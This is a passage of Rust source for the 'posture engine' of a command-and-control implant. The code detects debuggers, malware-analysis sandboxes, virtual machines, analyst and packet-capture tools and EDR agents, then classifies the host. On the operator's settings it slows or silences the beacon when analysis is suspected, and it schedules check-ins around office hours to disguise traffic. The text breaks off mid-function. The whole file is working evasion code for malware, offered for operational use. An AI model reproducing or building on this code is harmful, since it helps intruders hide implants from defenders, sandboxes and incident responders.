//! The posture engine.
//!
//! A beacon that behaves the same everywhere has a signature, and so does a
//! beacon that behaves like every other beacon.  The engine in this module
//! answers four questions about the host it runs on:
//!
//!   * is this real hardware or a virtual machine?
//!   * is there a person in front of it, or is it a server?
//!   * is it a developer's box, a build agent or a plain server?
//!   * is it a lab machine, a production machine or an analyst's sandbox?
//!
//! None of these answers is a verdict.  A virtual machine is ordinary in an
//! enterprise, a lab machine is a target worth having, and an analyst's
//! sandbox is a place where the beacon should be quiet.  The engine states
//! what it sees, how sure it is and why it thinks so; the operator decides
//! what it means.  The behaviour of the beacon follows the settings the
//! operator armed, and the defaults are conservative: the implant adapts
//! to its environment, but it never falls silent on its own.
//!
//! The module also owns the three things that make the traffic look like
//! something other than a beacon:
//!
//!   * the sleep schedule (busy during the working day, quiet at night,
//!     lazier at the weekend) and the jitter whose window is chosen once
//!     per cycle, so the heartbeat is not a uniform distribution;
//!   * the traffic shaping: the size of the frames, the order of the
//!     operations inside a cycle and the padding;
//!   * the kill switch: the operator's way of saying "this implant must
//!     stop existing at a given moment", with a blast radius they chose.

use std::fs;
use std::path::{Path, PathBuf};

use crate::upk::{self, Value};

// ---------------------------------------------------------------------------
// The evidence
// ---------------------------------------------------------------------------

/// One observation about the environment.
#[derive(Clone, Debug)]
pub struct Finding {
    /// "debugger" or "sandbox".
    pub kind: &'static str,
    /// What was observed, in plain words.
    pub detail: String,
}

impl Finding {
    fn new(kind: &'static str, detail: impl Into<String>) -> Self {
        Finding { kind, detail: detail.into() }
    }
}

/// User names that are hardly ever used on a production machine.
const SANDBOX_USERS: [&str; 11] = [
    "sandbox", "malware", "virus", "sample", "test", "cuckoo", "analyst", "john",
    "tequila", "infected", "virususer",
];

/// Host names that are hardly ever used on a production machine.
const SANDBOX_HOSTS: [&str; 11] = [
    "sandbox", "virus", "maltest", "tequila", "john-pc", "vbox", "teest", "crypto",
    "cuckoo", "analysis", "malware",
];

/// Virtual machine vendors and hypervisors, as they appear in the DMI data.
const VENDORS: [&str; 8] = [
    "vmware", "virtualbox", "innotek", "kvm", "qemu", "xen", "parallels", "bhyve",
];

/// Environment variables that only analysis environments set.
const SANDBOX_ENV: [&str; 8] = [
    "CUCKOO_ROOT", "SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "ANALYSIS", "DETONATE",
    "TCMOCK",
];

/// Windows modules that sandboxes inject into every process they watch.
const SANDBOX_DLLS: [&str; 5] = [
    "SbieDll.dll",   // Sandboxie
    "SxIn.dll",      // 360 Sandbox
    "cuckoomon.dll", // Cuckoo
    "cmdvrt32.exe",  // Microsoft Defender Sandbox
    "snxhk.dll",     // Avast
];

/// Is a debugger attached to this process?
///
/// Returns a short reason when one is, `None` when the process looks clean.
pub fn debugger() -> Option<String> {
    #[cfg(windows)]
    {
        return windows_debugger();
    }
    #[cfg(target_os = "linux")]
    {
        return linux_debugger();
    }
    #[cfg(not(any(windows, target_os = "linux")))]
    {
        None
    }
}

/// Windows: the two checks every debugger trips.
#[cfg(windows)]
fn windows_debugger() -> Option<String> {
    use std::ffi::c_void;

    extern "system" {
        fn IsDebuggerPresent() -> i32;
        fn CheckRemoteDebuggerPresent(process: *mut c_void, present: *mut i32) -> i32;
        fn GetCurrentProcess() -> *mut c_void;
    }

    if unsafe { IsDebuggerPresent() } != 0 {
        return Some("IsDebuggerPresent".to_string());
    }
    let mut present: i32 = 0;
    let ok = unsafe {
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut present)
    };
    if ok != 0 && present != 0 {
        return Some("CheckRemoteDebuggerPresent".to_string());
    }
    None
}

/// Linux: the tracer id in /proc/self/status.
#[cfg(target_os = "linux")]
fn linux_debugger() -> Option<String> {
    let status = match std::fs::read_to_string("/proc/self/status") {
        Ok(text) => text,
        Err(_) => return None,
    };
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("TracerPid:") {
            let pid = rest.trim();
            if !pid.is_empty() && pid != "0" {
                return Some(format!("TracerPid {pid}"));
            }
        }
    }
    None
}

/// Does the text look like one of the names in the list?
///
/// The comparison is deliberately strict: the whole name, or one of its
/// tokens, has to match.  A host called `mail.example.com` must not be
/// reported as "malware", and a user called `tester` is not a sandbox.
fn matches_name(text: &str, names: &[&str]) -> Option<String> {
    let lower = text.trim().to_lowercase();
    if lower.is_empty() {
        return None;
    }
    for name in names {
        if lower == *name {
            return Some(lower);
        }
    }
    let parts: Vec<&str> = lower
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|part| !part.is_empty())
        .collect();
    for name in names {
        let wanted: Vec<&str> = name.split('-').collect();
        if wanted.len() == 1 {
            if parts.iter().any(|part| *part == wanted[0]) {
                return Some(lower);
            }
        } else if parts.windows(wanted.len()).any(|window| {
            window.iter().map(|part| *part).eq(wanted.iter().copied())
        }) {
            return Some(lower);
        }
    }
    None
}

/// The sandbox indicators that were found.
///
/// An empty list means "nothing that looks like a sandbox".
pub fn sandbox() -> Vec<String> {
    let mut out = Vec::new();

    // The account and the machine name.
    let user = crate::sysinfo::username();
    if let Some(name) = matches_name(&user, &SANDBOX_USERS) {
        out.push(format!("user name looks like a sandbox ({name})"));
    }
    let host = crate::sysinfo::hostname();
    if let Some(name) = matches_name(&host, &SANDBOX_HOSTS) {
        out.push(format!("host name looks like a sandbox ({name})"));
    }

    // The environment.
    for name in SANDBOX_ENV {
        if std::env::var_os(name).is_some() {
            out.push(format!("environment variable {name} is set"));
        }
    }

    // The hypervisor.
    #[cfg(target_os = "linux")]
    {
        if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
            if cpuinfo.lines().any(|line| {
                line.starts_with("flags") && line.contains("hypervisor")
            }) {
                out.push("the cpu reports a hypervisor flag".to_string());
            }
        }
        for path in [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor",
        ] {
            if let Ok(text) = std::fs::read_to_string(path) {
                let vendor = text.trim().to_lowercase();
                if VENDORS.iter().any(|name| vendor.contains(name)) {
                    out.push(format!("{path} mentions {vendor}"));
                }
            }
        }
    }

    // The modules a Windows sandbox injects into every process.
    #[cfg(windows)]
    {
        out.extend(windows_sandbox_modules());
    }

    out
}

/// The sandbox modules that are loaded in this process.
#[cfg(windows)]
fn windows_sandbox_modules() -> Vec<String> {
    windows_loaded_modules()
        .into_iter()
        .map(|dll| format!("the sandbox module {dll} is loaded"))
        .collect()
}

/// Everything the implant observed about its environment.
pub fn findings() -> Vec<Finding> {
    let mut out = Vec::new();
    if let Some(reason) = debugger() {
        out.push(Finding::new("debugger", reason));
    }
    for detail in sandbox() {
        out.push(Finding::new("sandbox", detail));
    }
    out
}

/// The environment findings as a report for the operator.
pub fn report() -> String {
    let items = findings();
    if items.is_empty() {
        return "environment: nothing unusual\n".to_string();
    }
    let mut out = String::new();
    for item in &items {
        out.push_str(&format!("environment: {}: {}\n", item.kind, item.detail));
    }
    out
}

/// True when the machine looks like an analysis environment.
pub fn suspicious() -> bool {
    !findings().is_empty()
}

// ---------------------------------------------------------------------------
// The artefacts
// ---------------------------------------------------------------------------

/// One artefact that was found on the host.
///
/// An artefact is not a verdict.  A virtual machine is a normal thing to
/// find on a corporate network; an attached debugger is not.  Every entry
/// therefore carries a class, a severity and a confidence, and the operator
/// decides what the sum of them means.
#[derive(Clone, Debug)]
pub struct Artefact {
    /// The name as it appears on the host ("VMwareTools", "x64dbg").
    pub name: String,
    /// What kind of thing it is.
    pub class: &'static str,
    /// How much it matters, from 0 (nothing) to 100 (the analyst is
    /// watching this machine right now).
    pub severity: u8,
    /// How sure the engine is that it is really there, from 0 to 100.
    pub confidence: u8,
    /// Where it was seen.
    pub detail: String,
}

/// The artefacts the engine knows about.
///
/// The needle, the class, the severity and the confidence.  The list is
/// deliberately *not* a blacklist: a virtual machine is a hint, a sandbox
/// that injects itself into every process is nearly a proof, and an
/// analyst's debugger is a proof.
const ARTEFACTS: &[(&str, &str, u8, u8)] = &[
    // -- virtualisation: ordinary in an enterprise, only a hint ----------
    ("vmwaretools", "virtualisation", 15, 80),
    ("vboxservice", "virtualisation", 15, 80),
    ("vboxtray", "virtualisation", 10, 70),
    ("vboxguest", "virtualisation", 10, 70),
    ("qemu-ga", "virtualisation", 20, 80),
    ("vmsrvc", "virtualisation", 15, 75),
    ("xenstore", "virtualisation", 20, 80),
    ("prl_tools", "virtualisation", 20, 80),
    ("parallels", "virtualisation", 20, 80),
    // -- sandboxes: nothing legitimate injects these ----------------------
    ("sbiedll", "sandbox", 95, 95),
    ("sxindll", "sandbox", 90, 90),
    ("cuckoomon", "sandbox", 95, 95),
    ("cmdvrt32", "sandbox", 90, 90),
    ("snxhk", "sandbox", 85, 85),
    // -- capture: somebody is watching the traffic ------------------------
    ("wireshark", "capture", 70, 90),
    ("tshark", "capture", 70, 90),
    ("dumpcap", "capture", 70, 90),
    ("fiddler", "capture", 60, 80),
    ("charles", "capture", 55, 70),
    ("mitmproxy", "capture", 65, 85),
    ("tcpdump", "capture", 55, 80),
    // -- analyst tools: the machine is being analysed ---------------------
    ("procmon", "analyst-tool", 75, 90),
    ("procexp", "analyst-tool", 70, 85),
    ("autoruns", "analyst-tool", 70, 85),
    ("pestudio", "analyst-tool", 65, 80),
    ("regshot", "analyst-tool", 75, 85),
    ("x64dbg", "analyst-tool", 90, 95),
    ("x32dbg", "analyst-tool", 90, 95),
    ("ollydbg", "analyst-tool", 90, 95),
    ("ida64", "analyst-tool", 85, 90),
    ("idaq", "analyst-tool", 85, 90),
    ("dnspy", "analyst-tool", 85, 90),
    ("ghidra", "analyst-tool", 60, 70),
    // -- instrumentation: an EDR is watching, but it is not an analyst ---
    ("sysmon", "instrumentation", 60, 85),
    ("cb.exe", "instrumentation", 50, 60),
    ("mdeagent", "instrumentation", 55, 80),
];

/// The artefacts that were found on the host.
pub fn artefacts() -> Vec<Artefact> {
    let mut out = Vec::new();
    let processes = process_names();
    let modules = module_names();
    for (needle, class, severity, confidence) in ARTEFACTS {
        // The analyst's tools run as their own process.
        if let Some(name) = processes
            .iter()
            .find(|name| name.to_lowercase().contains(needle))
        {
            out.push(Artefact {
                name: (*needle).to_string(),
                class,
                severity: *severity,
                confidence: *confidence,
                detail: format!("the process {name} is running"),
            });
            continue;
        }
        // The sandboxes inject themselves into every process they watch,
        // including this one.
        if let Some(name) = modules
            .iter()
            .find(|name| name.to_lowercase().contains(needle))
        {
            out.push(Artefact {
                name: (*needle).to_string(),
                class,
                severity: *severity,
                confidence: *confidence,
                detail: format!("the module {name} is loaded"),
            });
        }
    }
    out
}

/// The names of the processes that are running.
fn process_names() -> Vec<String> {
    match crate::proc::processes() {
        Ok(list) => list.into_iter().map(|p| p.name).collect(),
        Err(_) => Vec::new(),
    }
}

/// The modules that are loaded in this process.
fn module_names() -> Vec<String> {
    let mut out = Vec::new();
    #[cfg(windows)]
    {
        out.extend(windows_loaded_modules());
    }
    #[cfg(target_os = "linux")]
    {
        if let Ok(maps) = fs::read_to_string("/proc/self/maps") {
            for line in maps.lines() {
                if let Some(path) = line.split_whitespace().last() {
                    if path.starts_with('/') {
                        out.push(path.to_string());
                    }
                }
            }
        }
    }
    out
}

/// The sandbox modules that are loaded in this process.
#[cfg(windows)]
fn windows_loaded_modules() -> Vec<String> {
    use std::ffi::{c_char, c_void};

    extern "system" {
        fn GetModuleHandleA(name: *const c_char) -> *mut c_void;
    }

    let mut out = Vec::new();
    for dll in SANDBOX_DLLS {
        let mut name = dll.as_bytes().to_vec();
        name.push(0);
        let handle = unsafe { GetModuleHandleA(name.as_ptr() as *const c_char) };
        if !handle.is_null() {
            out.push(dll.to_string());
        }
    }
    out
}

// ---------------------------------------------------------------------------
// The posture
// ---------------------------------------------------------------------------

/// What the engine thinks the host is.
///
/// The axes are independent on purpose: a machine can be a virtual
/// workstation in a lab, and a physical server in production.  The engine
/// states what it sees and how sure it is; the operator decides what it
/// means.
#[derive(Clone, Debug, Default)]
pub struct Posture {
    /// The host runs on virtual hardware.
    pub virtualised: bool,
    /// A person is (or can be) sitting in front of it.
    pub workstation: bool,
    /// It carries the tools of a developer or of a build agent.
    pub developer: bool,
    /// It looks like a lab machine rather than a production one.
    pub lab: bool,
    /// It looks like an analyst's sandbox.
    pub sandbox: bool,
    /// How sure the engine is, from 0 to 100.
    pub confidence: u8,
    /// The evidence, one line per signal.
    pub reasons: Vec<String>,
    /// The artefacts that were found.
    pub artefacts: Vec<Artefact>,
}

impl Posture {
    /// Look at the host and say what it is.
    pub fn classify() -> Posture {
        let mut posture = Posture::default();
        let artefacts = artefacts();
        posture.artefacts = artefacts;

        // -- virtualisation ------------------------------------------------
        //
        // The evidence is collected first and applied afterwards: the
        // artefacts are borrowed from the posture, and the posture is
        // written to while the evidence is gathered.
        let mut evidence: Vec<(String, u8)> = Vec::new();
        let mut virtualised = false;
        for artefact in &posture.artefacts {
            if artefact.class == "virtualisation" {
                virtualised = true;
                evidence.push((artefact.detail.clone(), artefact.confidence / 4));
            }
        }
        for signal in hypervisor_signals() {
            virtualised = true;
            evidence.push((signal, 20));
        }
        posture.virtualised = virtualised;
        for (reason, weight) in evidence {
            posture.add(&reason, weight);
        }

        // -- a person in front of it ---------------------------------------
        let desktop = desktop_signals();
        if !desktop.is_empty() {
            posture.workstation = true;
            for signal in desktop {
                posture.add(&signal, 15);
            }
        }

        // -- a developer's box ----------------------------------------------
        let developer = developer_signals();
        if !developer.is_empty() {
            posture.developer = true;
            for signal in developer {
                posture.add(&signal, 12);
            }
        }

        // -- a lab machine or a production machine --------------------------
        let lab = lab_signals();
        if !lab.is_empty() {
            posture.lab = true;
            for signal in lab {
                posture.add(&signal, 12);
            }
        }
        if domain_joined() {
            posture.lab = false;
            posture.add("the machine is joined to a domain", 25);
        }

        // -- an analyst's sandbox -------------------------------------------
        let analysis = analysis_signals(&posture.artefacts);
        if !analysis.is_empty() {
            posture.sandbox = true;
            for signal in analysis {
                posture.add(&signal, 20);
            }
        }
        if let Some(reason) = debugger() {
            posture.sandbox = true;
            posture.add(&format!("a debugger is attached ({reason})"), 30);
        }

        posture
    }

    /// Add a piece of evidence and raise the confidence with it.
    fn add(&mut self, reason: &str, weight: u8) {
        self.reasons.push(reason.to_string());
        self.confidence = self.confidence.saturating_add(weight).min(100);
    }

    /// How much the host deserves to be trusted, from 0 to 100.
    ///
    /// The score is the sum of the severities of the artefacts, with the
    /// sandbox artefacts counting double: a machine that injects a sandbox
    /// into every process is not a machine that merely runs a virtual
    /// machine.
    pub fn severity(&self) -> u8 {
        let mut score: u32 = 0;
        for artefact in &self.artefacts {
            let weight = if artefact.class == "sandbox" { 2 } else { 1 };
            score += artefact.severity as u32 * weight;
        }
        score.min(100) as u8
    }

    /// The one-line name of the posture.
    pub fn label(&self) -> String {
        let mut parts: Vec<&str> = Vec::new();
        if self.sandbox {
            parts.push("analyst sandbox");
        } else if self.lab {
            parts.push("lab machine");
        } else if self.developer {
            parts.push("developer box");
        } else if self.workstation {
            parts.push("workstation");
        } else {
            parts.push("server");
        }
        if self.virtualised {
            parts.push("virtual");
        }
        parts.join(" ")
    }

    /// The posture as a report for the operator.
    pub fn report(&self) -> String {
        let mut out = String::new();
        out.push_str(&format!("posture: {}\n", self.label()));
        out.push_str(&format!(
            "posture: confidence {}%, severity {}%\n",
            self.confidence,
            self.severity()
        ));
        out.push_str(&format!(
            "posture: virtual={} workstation={} developer={} lab={} sandbox={}\n",
            self.virtualised, self.workstation, self.developer, self.lab, self.sandbox
        ));
        for artefact in &self.artefacts {
            out.push_str(&format!(
                "posture: artefact {} [{}] severity {} confidence {}: {}\n",
                artefact.name, artefact.class, artefact.severity, artefact.confidence, artefact.detail
            ));
        }
        for reason in &self.reasons {
            out.push_str(&format!("posture: because {reason}\n"));
        }
        out
    }

    /// The posture as an upk value, so it travels with the result.
    pub fn to_value(&self) -> Value {
        let artefacts: Vec<Value> = self
            .artefacts
            .iter()
            .map(|artefact| {
                upk::map(vec![
                    ("name", upk::s(&artefact.name)),
                    ("class", upk::s(artefact.class)),
                    ("severity", upk::u(artefact.severity as u64)),
                    ("confidence", upk::u(artefact.confidence as u64)),
                    ("detail", upk::s(&artefact.detail)),
                ])
            })
            .collect();
        upk::map(vec![
            ("label", upk::s(&self.label())),
            ("virtual", upk::bool_(self.virtualised)),
            ("workstation", upk::bool_(self.workstation)),
            ("developer", upk::bool_(self.developer)),
            ("lab", upk::bool_(self.lab)),
            ("sandbox", upk::bool_(self.sandbox)),
            ("confidence", upk::u(self.confidence as u64)),
            ("severity", upk::u(self.severity() as u64)),
            ("reasons", upk::arr(
                self.reasons.iter().map(|r| upk::s(r)).collect(),
            )),
            ("artefacts", upk::arr(artefacts)),
        ])
    }
}

/// The signals that say "this is virtual hardware".
fn hypervisor_signals() -> Vec<String> {
    let mut out = Vec::new();
    #[cfg(target_os = "linux")]
    {
        if let Ok(cpuinfo) = fs::read_to_string("/proc/cpuinfo") {
            if cpuinfo.lines().any(|line| {
                line.starts_with("flags") && line.contains("hypervisor")
            }) {
                out.push("the cpu reports a hypervisor flag".to_string());
            }
        }
        for path in [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
        ] {
            if let Ok(text) = fs::read_to_string(path) {
                let vendor = text.trim().to_lowercase();
                if VENDORS.iter().any(|name| vendor.contains(name)) {
                    out.push(format!("the hardware says {vendor}"));
                }
            }
        }
    }
    #[cfg(target_os = "macos")]
    {
        if let Ok(out_hv) = std::process::Command::new("sysctl")
            .args(["-n", "kern.hv_support"])
            .output()
        {
            if String::from_utf8_lossy(&out_hv.stdout).trim() == "1" {
                out.push("the kernel reports a hypervisor".to_string());
            }
        }
    }
    out
}

/// The signals that say "somebody is using this machine".
fn desktop_signals() -> Vec<String> {
    let mut out = Vec::new();
    if std::env::var_os("DISPLAY").is_some() || std::env::var_os("WAYLAND_DISPLAY").is_some() {
        out.push("the session has a display".to_string());
    }
    let processes = process_names();
    for marker in DESKTOP_PROCESSES {
        if let Some(name) = processes
            .iter()
            .find(|name| name.to_lowercase().contains(marker))
        {
            out.push(format!("the desktop process {name} is running"));
            break;
        }
    }
    out
}

/// The processes that only run when somebody is looking at the machine.
const DESKTOP_PROCESSES: [&str; 11] = [
    "explorer.exe",
    "dwm.exe",
    "gnome-shell",
    "plasmashell",
    "xfce4-session",
    "cinnamon",
    "mate-session",
    "dock.app",
    "windowserver",
    "finder",
    "ksmserver",
];

/// The markers of a developer's box.
const DEVELOPER_MARKERS: [&str; 14] = [
    ".gitconfig", ".cargo", ".rustup", ".nvm", ".sdkman", ".m2", ".gradle",
    ".nuget", ".pyenv", ".rbenv", ".kube", "go/src", ".git", ".viminfo",
];

/// The processes of the tools a developer runs.
const DEVELOPER_PROCESSES: [&str; 10] = [
    "code", "pycharm", "idea", "rider", "devenv", "emacs", "vim", "gdb",
    "lldb", "node",
];

/// The markers of a build agent.
const BUILD_MARKERS: [&str; 6] = [
    ".gitlab-ci.yml",
    "jenkinsfile",
    "azure-pipelines.yml",
    ".circleci",
    "dockerfile",
    ".github/workflows",
];

/// The signals that say "this box belongs to somebody who writes software".
fn developer_signals() -> Vec<String> {
    let mut out = Vec::new();
    let home = home_dir();
    for marker in DEVELOPER_MARKERS {
        if home.join(marker).exists() {
            out.push(format!("the home directory holds {marker}"));
            break;
        }
    }
    for marker in BUILD_MARKERS {
        if home.join(marker).exists() {
            out.push(format!("the home directory holds {marker}"));
            break;
        }
    }
    let processes = process_names();
    for marker in DEVELOPER_PROCESSES {
        if let Some(name) = processes
            .iter()
            .find(|name| name.to_lowercase().contains(marker))
        {
            out.push(format!("the tool {name} is running"));
            break;
        }
    }
    out
}

/// The signals that say "this machine was set up for a test, not for work".
fn lab_signals() -> Vec<String> {
    let mut out = Vec::new();
    let host = crate::sysinfo::hostname().to_uppercase();
    for prefix in ["DESKTOP-", "WIN-", "PC-", "TEST-", "TEMP-", "LAB-", "SANDBOX"] {
        if host.starts_with(prefix) {
            out.push(format!("the host name {host} is a default one"));
            break;
        }
    }
    let user = crate::sysinfo::username().to_lowercase();
    for name in SANDBOX_USERS {
        if user == name {
            out.push(format!("the account {user} is a test account"));
            break;
        }
    }
    let uptime = uptime_hours();
    if uptime > 0.0 && uptime < 1.0 {
        out.push("the machine was booted less than an hour ago".to_string());
    }
    if Path::new("/etc/skel").exists() && !Path::new("/var/log/apt/history.log").exists() {
        out.push("the machine has no package history".to_string());
    }
    out
}

/// Is the machine part of a domain?
fn domain_joined() -> bool {
    #[cfg(windows)]
    {
        let args = upk::map(vec![
            ("hive", upk::s("HKLM")),
            (
                "key",
                upk::s("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName"),
            ),
            ("value", upk::s("Domain")),
        ]);
        match crate::registry::read(&args) {
            Ok(text) => {
                let value = text.trim();
                !value.is_empty() && !value.contains("(value not set)")
            }
            Err(_) => false,
        }
    }
    #[cfg(not(windows))]
    {
        Path::new("/etc/krb5.conf").exists()
    }
}

/// The signals that say "an analyst is looking at this machine".
fn analysis_signals(artefacts: &[Artefact]) -> Vec<String> {
    let mut out = Vec::new();
    for artefact in artefacts {
        match artefact.class {
            "sandbox" => out.push(format!("the sandbox module {} is present", artefact.name)),
            "analyst-tool" => out.push(format!("the analyst tool {} is present", artefact.name)),
            "capture" => out.push(format!("the capture tool {} is present", artefact.name)),
            _ => {}
        }
    }
    // A machine that was booted minutes ago and runs a virtual machine is
    // the shape of an analysis sandbox.
    let uptime = uptime_hours();
    if uptime > 0.0 && uptime < 2.0 {
        out.push("the machine was booted minutes ago".to_string());
    }
    out
}

// ---------------------------------------------------------------------------
// The behaviour policy
// ---------------------------------------------------------------------------

/// What the operator decided about the posture.
///
/// The defaults are conservative on purpose: the implant adapts to the
/// environment it runs in, but it never goes silent and never slows to a
/// crawl unless the operator said so.
#[derive(Clone, Debug)]
pub struct Settings {
    /// Whether a sandbox makes the beacon stop answering.
    pub silence_on_sandbox: bool,
    /// Whether a sandbox makes the beacon slower.
    pub slow_on_sandbox: bool,
    /// The factor a virtual host stretches the sleep with, in percent.
    pub virtual_factor: u32,
    /// The factor a sandbox stretches the sleep with, in percent.
    pub sandbox_factor: u32,
    /// The factor a lab machine stretches the sleep with, in percent.
    pub lab_factor: u32,
    /// The factor a developer box stretches the sleep with, in percent.
    pub developer_factor: u32,
    /// The extra jitter a suspicious host gets, in percentage points.
    pub jitter_bonus: u32,
}

impl Default for Settings {
    fn default() -> Self {
        Settings {
            silence_on_sandbox: false,
            slow_on_sandbox: true,
            virtual_factor: 125,
            sandbox_factor: 200,
            lab_factor: 100,
            developer_factor: 100,
            jitter_bonus: 15,
        }
    }
}

impl Settings {
    /// The upk value of the settings.
    pub fn to_value(&self) -> Value {
        upk::map(vec![
            ("silence_on_sandbox", upk::bool_(self.silence_on_sandbox)),
            ("slow_on_sandbox", upk::bool_(self.slow_on_sandbox)),
            ("virtual_factor", upk::u(self.virtual_factor as u64)),
            ("sandbox_factor", upk::u(self.sandbox_factor as u64)),
            ("lab_factor", upk::u(self.lab_factor as u64)),
            ("developer_factor", upk::u(self.developer_factor as u64)),
            ("jitter_bonus", upk::u(self.jitter_bonus as u64)),
        ])
    }

    /// Read the settings out of an upk value.
    pub fn from_value(value: &Value) -> Settings {
        let mut settings = Settings::default();
        settings.silence_on_sandbox =
            value.bool_or("silence_on_sandbox", settings.silence_on_sandbox);
        settings.slow_on_sandbox = value.bool_or("slow_on_sandbox", settings.slow_on_sandbox);
        settings.virtual_factor = value.u64_or("virtual_factor", settings.virtual_factor as u64)
            as u32;
        settings.sandbox_factor = value.u64_or("sandbox_factor", settings.sandbox_factor as u64)
            as u32;
        settings.lab_factor = value.u64_or("lab_factor", settings.lab_factor as u64) as u32;
        settings.developer_factor =
            value.u64_or("developer_factor", settings.developer_factor as u64) as u32;
        settings.jitter_bonus = value.u64_or("jitter_bonus", settings.jitter_bonus as u64) as u32;
        settings
    }
}

/// How the environment changes the behaviour of the beacon.
#[derive(Clone, Copy, Debug)]
pub struct Policy {
    /// The factor the sleep interval is multiplied with.
    pub sleep_factor: f64,
    /// The extra jitter, in percentage points.
    pub jitter_bonus: u32,
    /// Whether the sleep is obfuscated.
    pub obfuscate: bool,
    /// Whether the beacon answers at all.
    pub silence: bool,
}

impl Posture {
    /// How the beacon should behave on this host.
    pub fn policy(&self, settings: &Settings) -> Policy {
        let mut factor = 100.0f64;
        if self.virtualised {
            factor = factor * settings.virtual_factor as f64 / 100.0;
        }
        if self.lab {
            factor = factor * settings.lab_factor as f64 / 100.0;
        }
        if self.developer {
            factor = factor * settings.developer_factor as f64 / 100.0;
        }
        let mut jitter_bonus = 0;
        let mut silence = false;
        if self.sandbox {
            if settings.silence_on_sandbox {
                silence = true;
            }
            if settings.slow_on_sandbox {
                factor = factor * settings.sandbox_factor as f64 / 100.0;
                jitter_bonus = settings.jitter_bonus;
            }
        }
        Policy {
            sleep_factor: factor.max(1.0),
            jitter_bonus,
            obfuscate: true,
            silence,
        }
    }
}

// ---------------------------------------------------------------------------
// The sleep schedule
// ---------------------------------------------------------------------------

/// The local time of the host.
#[derive(Clone, Copy, Debug)]
pub struct LocalTime {
    /// The day of the week, 1 = Monday and 7 = Sunday.
    pub weekday: u8,
    /// The hour of the day, 0 to 23.
    pub hour: u8,
    /// The minute of the hour.
    pub minute: u8,
}

impl LocalTime {
    /// Is it the weekend?
    pub fn weekend(&self) -> bool {
        self.weekday >= 6
    }
}

/// The local time of the host.
pub fn local_time() -> LocalTime {
    #[cfg(windows)]
    {
        windows_local_time()
    }
    #[cfg(not(windows))]
    {
        unix_local_time()
    }
}

/// The time as the shell reports it: the `date` command knows the time zone
/// of the host, including the daylight saving rules.
#[cfg(not(windows))]
fn unix_local_time() -> LocalTime {
    if let Ok(out) = std::process::Command::new("date").arg("+%u %H %M").output() {
        let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
        let parts: Vec<&str> = text.split_whitespace().collect();
        if parts.len() == 3 {
            let weekday = parts[0].parse::<u8>().unwrap_or(1).clamp(1, 7);
            let hour = parts[1].parse::<u8>().unwrap_or(0) % 24;
            let minute = parts[2].parse::<u8>().unwrap_or(0) % 60;
            return LocalTime { weekday, hour, minute };
        }
    }
    utc_time()
}

/// The time as Windows reports it.
#[cfg(windows)]
fn windows_local_time() -> LocalTime {
    #[repr(C)]
    struct SystemTime {
        year: u16,
        month: u16,
        day_of_week: u16,
        day: u16,
        hour: u16,
        minute: u16,
        second: u16,
        millis: u16,
    }
    extern "system" {
        fn GetLocalTime(time: *mut SystemTime);
    }
    let mut time = SystemTime {
        year: 0,
        month: 0,
        day_of_week: 0,
        day: 0,
        hour: 0,
        minute: 0,
        second: 0,
        millis: 0,
    };
    unsafe { GetLocalTime(&mut time) };
    // Windows counts the week from Sunday, the profile from Monday.
    let weekday = if time.day_of_week == 0 { 7 } else { time.day_of_week as u8 };
    LocalTime {
        weekday,
        hour: time.hour as u8,
        minute: time.minute as u8,
    }
}

/// The time in UTC, used when the host cannot tell us anything better.
fn utc_time() -> LocalTime {
    let epoch = now_epoch();
    let hour = ((epoch / 3600) % 24) as u8;
    let minute = ((epoch % 3600) / 60) as u8;
    let days = epoch / 86400;
    // The first of January 1970 was a Thursday.
    let weekday = ((days + 3) % 7 + 1) as u8;
    LocalTime { weekday, hour, minute }
}

/// The schedule the beacon sleeps by.
///
/// A flat sleep interval is a signature: the check-ins arrive every sixty
/// seconds and the histogram of the gaps between them has one spike.  The
/// profile spreads the day instead: the beacon is busy while the office is
/// open (a short interval, because that is when the operator is waiting
/// for an answer), quiet at night (a long one) and lazier at the weekend,
/// because a machine that is quiet on Saturday night is a machine nobody
/// is watching.
#[derive(Clone, Debug)]
pub struct SleepProfile {
    /// The base interval, in seconds.
    pub base: u64,
    /// The first hour of the working day.
    pub busy_start: u8,
    /// The first hour after the working day.
    pub busy_end: u8,
    /// The factor during the working day, in percent.
    pub busy_factor: u32,
    /// The factor at night, in percent.
    pub night_factor: u32,
    /// The factor at the weekend, in percent.
    pub weekend_factor: u32,
    /// Whether the jitter window itself moves from cycle to cycle.
    pub jittered_jitter: bool,
}

impl Default for SleepProfile {
    fn default() -> Self {
        SleepProfile {
            // Zero means "the interval the beacon was configured with": the
            // profile only stretches it, it does not replace it, until the
            // operator names a base of its own.
            base: 0,
            busy_start: 8,
            busy_end: 18,
            busy_factor: 60,
            night_factor: 180,
            weekend_factor: 150,
            jittered_jitter: true,
        }
    }
}

impl SleepProfile {
    /// The factor the base interval is multiplied with at this moment.
    pub fn factor(&self, now: LocalTime) -> f64 {
        let busy = if self.busy_start <= self.busy_end {
            now.hour >= self.busy_start && now.hour < self.busy_end
        } else {
            // The working day wrapped around midnight.
            now.hour >= self.busy_start || now.hour < self.busy_end
        };
        let mut factor = if busy {
            self.busy_factor as f64
        } else {
            self.night_factor as f64
        };
        if now.weekend() {
            factor = factor * self.weekend_factor as f64 / 100.0;
        }
        factor / 100.0
    }

    /// The upk value of the profile.
    pub fn to_value(&self) -> Value {
        upk::map(vec![
            ("base", upk::u(self.base)),
            ("busy_start", upk::u(self.busy_start as u64)),
            ("busy_end", upk::u(self.busy_end as u64)),
            ("busy_factor", upk::u(self.busy_factor as u64)),
            ("night_factor", upk::u(self.night_factor as u64)),
            ("weekend_factor", upk::u(self.weekend_factor as u64)),
            ("jittered_jitter", upk::bool_(self.jittered_jitter)),
        ])
    }

    /// Read the profile out of an upk value.
    pub fn from_value(value: &Value) -> SleepProfile {
        let mut profile = SleepProfile::default();
        profile.base = value.u64_or("base", profile.base);
        profile.busy_start = value.u64_or("busy_start", profile.busy_start as u64) as u8;
        profile.busy_end = value.u64_or("busy_end", profile.busy_end as u64) as u8;
